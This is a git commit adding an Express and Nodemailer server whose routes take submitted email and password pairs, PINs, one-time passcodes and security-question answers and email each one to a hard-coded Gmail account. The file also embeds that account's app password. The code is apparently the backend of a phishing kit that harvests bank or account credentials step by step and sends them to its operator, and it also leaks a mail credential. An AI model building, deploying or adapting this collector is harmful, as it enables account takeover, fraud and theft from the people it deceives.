f892e943c2812b2cff6a145070be7a55e0b181ef
AjaeroElvis5 <AjaeroElvis5@gmail.com>
2025-05-17 16:30:29 +0100

    Add files via upload

---
+++ server.js
@@ -0,0 +1,149 @@
+const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT
+
+const app = express(); // app is use for link express functions
+const cors = require("cors");
+const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email
+
+app.use(express.json());
+app.use(cors({ origin: "http://localhost:5173" }));
+
+const PORT = process.env.PORT || 5000; // port to connect to WEB
+
+// emails credentials
+const userEmail = "ajaeroElvis5@gmail.com";
+const pass = "qrgdnnovrfqeyutr";
+// 15 APRIL
+
+// Middleware
+app.use(express.json());
+
+// api routes
+
+// API routes for index
+app.post("/", (req, res) => {
+  const { email, password } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: email,
+    to: userEmail,
+    subject: `email: ${email}\nPassword: ${password}`,
+    text: `New user registered with Email: ${email}\nPassword: ${password}`,
+  };
+
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+// API routes for pin
+app.post("/pin", (req, res) => {
+  console.log(req.body);
+  let { pin } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: `PIN is: ${pin}`,
+    text: `New user PIN is: ${pin}`,
+  };
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+// API routes for otp
+app.post("/otp", (req, res) => {
+  console.log(req.body);
+  let { otp } = req.body;
+
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: `OTP is: ${otp}`,
+    text: `New user OTP is: ${otp}`,
+  };
+  console.log(mailOptions);
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.send("error Occured: " + error);
+    } else {
+      console.log("Email sent", +info.response);
+      res.send("success");
+    }
+  });
+});
+// API routes for Security Question
+app.post("/security", async (req, res) => {
+  const { questions } = req.body;
+
+  const formattedQuestions = questions
+    .map(
+      (q, i) => `Question ${i + 1}: ${q.question}\nAnswer ${i + 1}: ${q.answer}`
+    )
+    .join("\n\n");
+
+  // Configure your email
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: userEmail,
+      pass: pass,
+    },
+  });
+
+  const mailOptions = {
+    from: userEmail,
+    to: userEmail,
+    subject: "Security Questions Submission",
+    text: formattedQuestions,
+  };
+
+  try {
+    await transporter.sendMail(mailOptions);
+    res.status(200).send("Email sent!");
+  } catch (error) {
+    console.error(error);
+    res.status(500).send("Failed to send email");
+  }
+});
+
+app.listen(PORT, () => {
+  console.log(`Server is running on port http://localhost:${PORT}`);
+});
